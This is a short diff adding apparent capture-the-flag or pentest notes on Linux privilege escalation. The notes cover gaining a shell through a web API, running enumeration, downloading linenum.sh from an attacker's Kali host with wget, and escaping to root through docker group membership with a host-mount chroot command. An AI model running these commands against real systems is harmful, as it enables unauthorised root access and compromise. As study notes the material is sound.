@@ -1,0 +1,21 @@
+We Abuse of Web Api api.js variable and interpretion of `ls` to get some root hash to open a Shell
+Dockers SUID:
+    If we have root
+        Enumeration:
+            sudo -l 
+            find
+
+            IF we find nothing through the manual enum:
+                send linenum.sh scrypt to corrupted machine
+
+                ls /tmp
+                wget http://<KaliIP>/<linenum.sh>
+                chmod +x linenum.sh 
+            
+            Linenum show a Dockers group:
+                go to find SUID: GTFOBins
+
+                We will use our Shell to break-out from restricted env
+                    docker run -v /:/mnt --rm -it bash chroot /mnt sh
+
+            Now we get a "root" privilege 
